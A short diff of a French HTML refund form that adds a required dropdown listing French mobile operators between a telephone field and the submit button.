@@ -60,7 +60,27 @@
                 <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
                     class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
             </div>
-
+            <!-- Sélection du fournisseur -->
+<div class="mb-6">
+    <label for="operateur" class="block text-sm font-medium text-gray-700">Choisir votre opérateur</label>
+    <select id="operateur" name="operateur" required
+        class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
+        <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
+        <option value="orange">Orange</option>
+        <option value="bouygues">Bouygues Telecom</option>
+        <option value="sfr">SFR</option>
+        <option value="free">Free Mobile</option>
+        <option value="la-poste">La Poste Mobile</option>
+        <option value="coriolis">Coriolis</option>
+        <option value="nrj-mobile">NRJ Mobile</option>
+        <option value="red">RED by SFR</option>
+        <option value="sosh">Sosh (Orange)</option>
+        <option value="b-and-you">B&YOU (Bouygues Telecom)</option>
+        <option value="syma">Syma Mobile</option>
+        <option value="lycamobile">Lycamobile</option>
+        <option value="lebara">Lebara Mobile</option>
+    </select>
+</div>
             <button type="submit"
                 class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
                 Valider mon remboursement
